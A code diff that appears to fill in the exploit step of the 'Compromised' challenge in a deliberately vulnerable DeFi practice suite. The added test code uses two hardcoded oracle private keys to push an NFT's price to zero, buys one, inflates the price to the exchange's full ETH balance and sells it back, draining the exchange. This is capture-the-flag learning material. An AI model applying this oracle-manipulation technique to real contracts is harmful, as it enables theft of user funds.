@@ -61,6 +61,23 @@ describe('Compromised challenge', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+        let privKeyA = "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9";
+        let privKeyB = "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48";
+        let walletA = new ethers.Wallet(privKeyA,ethers.provider)
+        let walletB = new ethers.Wallet(privKeyB,ethers.provider)
+
+        await this.oracle.connect(walletA).postPrice("DVNFT",0)
+        await this.oracle.connect(walletB).postPrice("DVNFT",0)
+        let res = await this.exchange.connect(attacker).buyOne({value:ethers.utils.parseEther("0.01")});
+        let recipt =await res.wait()
+        let tokenId = recipt.logs[1].data
+        console.log(tokenId)
+        await this.oracle.connect(walletA).postPrice("DVNFT",EXCHANGE_INITIAL_ETH_BALANCE)
+        await this.oracle.connect(walletB).postPrice("DVNFT",EXCHANGE_INITIAL_ETH_BALANCE)
+        await this.nftToken.connect(attacker).approve(this.exchange.address,tokenId)
+        await this.exchange.connect(attacker).sellOne(tokenId)
+        await this.oracle.connect(walletA).postPrice("DVNFT",INITIAL_NFT_PRICE)
+        await this.oracle.connect(walletB).postPrice("DVNFT",INITIAL_NFT_PRICE)
     });
 
     after(async function () {
